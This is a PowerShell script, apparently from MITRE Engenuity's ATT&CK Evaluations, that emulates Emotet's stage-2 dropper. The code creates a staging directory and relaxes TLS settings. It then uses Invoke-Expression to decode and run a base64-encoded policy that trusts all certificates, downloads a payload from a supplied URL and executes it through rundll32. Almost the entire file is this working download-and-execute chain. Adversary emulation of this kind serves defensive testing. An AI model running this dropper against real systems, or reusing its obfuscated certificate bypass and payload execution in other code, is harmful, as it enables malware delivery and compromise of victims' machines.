function Get-EmotetExecutable {
    <#
    .SYNOPSIS
    Emulates Emotet's stage 2 PowerShell dropper.

       Author(s):   Michael C. Long II
    Organization:   MITRE Engenuity
         Version:   1.0
         Created:   March 3rd, 2021

    .DESCRIPTION
    Get-EmotetExecutable emulates Emotet's stage 2 PowerShell dropper.
    This script downloads a file over HTTP/S using a .Net web client object,
    and writes the file to a location selected by the user.
    The script executes the downloaded file with the 'Invoke-Item' cmdlet.

    .PARAMETER URL
    The URL to the web server. Example: "http://192.168.1.10:8080/my_file.exe"

    .PARAMETER OutDir
    The directory in which to place the downloaded file.

    .PARAMETER OutFile
    The name of the file when written to disk.

    .EXAMPLE
    Get-EmotetExecutable -URL "http://localhost:8080/test_program.exe" -OutDir $env:AppData\Testing -OutFile "test_program.exe"

    .LINK
    https://www.carbonblack.com/blog/cb-tau-threat-intelligence-notification-emotet-utilizing-wmi-to-launch-powershell-encoded-code/
    #>

    [CmdletBinding()]
    param(
        [Parameter(Mandatory = $true, HelpMessage = "The URL to the web server. Example: 'http://192.168.1.10:8080/my_file.exe'")]
        [string]$URL,

        [Parameter(Mandatory = $true, HelpMessage = "The directory in which to place the downloaded file.")]
        [string]$OutDir,

        [Parameter(Mandatory = $true, HelpMessage = "The name of the file when written to disk.")]
        [string]$OutFile
    )

    #<Start-ATT&CK-Evals-Delimiter>

    # Create staging directory
    sleep 5
    Write-Host "Creating staging directory"
    New-Item -Path $outdir -ItemType Directory -erroraction silentlycontinue

    # combine outdir and outfile to make relative file path
    $exec_path = $outdir + "\" + $outfile

    # Set TLS versions
    Write-Host "Relaxing TLS settings"
    [Net.ServicePointManager]::"SecurityProtocol" = "Tls, Tls11, Tls12"

    # Ignore self-signed certificate errors; we had to base64 encode this
    # because PowerShell's inline C# syntax is incompatible with our obfuscator
    # See "ignore_tls_errors.ps1" for the decoded script
    $ignore_tls_errors_encoded = "YQBkAGQALQB0AHkAcABlACAAQAAiAAoAIAAgACAAIAB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQAuAE4AZQB0ADsACgAgACAAIAAgAHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AUwBlAGMAdQByAGkAdAB5AC4AQwByAHkAcAB0AG8AZwByAGEAcABoAHkALgBYADUAMAA5AEMAZQByAHQAaQBmAGkAYwBhAHQAZQBzADsACgAgACAAIAAgAHAAdQBiAGwAaQBjACAAYwBsAGEAcwBzACAAVAByAHUAcwB0AEEAbABsAEMAZQByAHQAcwBQAG8AbABpAGMAeQAgADoAIABJAEMAZQByAHQAaQBmAGkAYwBhAHQAZQBQAG8AbABpAGMAeQAgAHsACgAgACAAIAAgACAAIAAgACAAcAB1AGIAbABpAGMAIABiAG8AbwBsACAAQwBoAGUAYwBrAFYAYQBsAGkAZABhAHQAaQBvAG4AUgBlAHMAdQBsAHQAKAAKACAAIAAgACAAIAAgACAAIAAgACAAIAAgAFMAZQByAHYAaQBjAGUAUABvAGkAbgB0ACAAcwByAHYAUABvAGkAbgB0ACwAIABYADUAMAA5AEMAZQByAHQAaQBmAGkAYwBhAHQAZQAgAGMAZQByAHQAaQBmAGkAYwBhAHQAZQAsAAoAIAAgACAAIAAgACAAIAAgACAAIAAgACAAVwBlAGIAUgBlAHEAdQBlAHMAdAAgAHIAZQBxAHUAZQBzAHQALAAgAGkAbgB0ACAAYwBlAHIAdABpAGYAaQBjAGEAdABlAFAAcgBvAGIAbABlAG0AKQAgAHsACgAgACAAIAAgACAAIAAgACAAIAAgACAAIAByAGUAdAB1AHIAbgAgAHQAcgB1AGUAOwAKACAAIAAgACAAIAAgACAAIAB9AAoAIAAgACAAIAB9AAoAIgBAAAoAWwBTAHkAcwB0AGUAbQAuAE4AZQB0AC4AUwBlAHIAdgBpAGMAZQBQAG8AaQBuAHQATQBhAG4AYQBnAGUAcgBdADoAOgBDAGUAcgB0AGkAZgBpAGMAYQB0AGUAUABvAGwAaQBjAHkAIAA9ACAATgBlAHcALQBPAGIAagBlAGMAdAAgAFQAcgB1AHMAdABBAGwAbABDAGUAcgB0AHMAUABvAGwAaQBjAHkA"
    $ignore_tls_errors = [System.Text.Encoding]::Unicode.GetString([System.Convert]::FromBase64String($ignore_tls_errors_encoded))
    Invoke-Expression($ignore_tls_errors)
    [Net.ServicePointManager]::CertificatePolicy = New-Object TrustAllCertsPolicy

    # create web client
    $web_client = New-Object System.Net.WebClient

    # download file
    Write-Host "Downloading payload"
    $web_client.DownloadFile($URL, $exec_path)

    # Execute file
    # Invoke-Item -Path $exec_path
    Write-Host "Executing payload"
    $args = $exec_path + ",Control_RunDLL"
    rundll32.exe $args
    sleep 5

    #<End-ATT&CK-Evals-Delimiter>
}